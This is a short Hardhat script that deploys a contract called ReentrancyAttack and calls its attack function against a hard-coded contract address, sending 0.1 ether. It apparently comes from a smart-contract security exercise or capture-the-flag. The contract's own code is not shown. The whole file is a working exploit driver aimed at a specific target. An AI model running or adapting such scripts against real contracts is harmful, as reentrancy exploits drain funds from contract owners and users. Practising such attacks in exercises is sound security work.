import { ethers } from "hardhat"

async function main() {
  const target = "0xFbacfa1772c5BFE9b5a91fd7b0d785D6E64d116C"

  const ReentrancyAttack = await ethers.getContractFactory("ReentrancyAttack")
  const reentrancyAttack = await ReentrancyAttack.deploy()

  await reentrancyAttack.deployed()

  console.log("ReentrancyAttack deployed to:", reentrancyAttack.address)

  await reentrancyAttack.attack(target, {
    value: ethers.utils.parseEther("0.1"),
    gasLimit: 1000000,
  })

  console.log("Done!")
}

main()
  .then(() => process.exit(0))
  .catch((error) => {
    console.error(error)
    process.exit(1)
  })
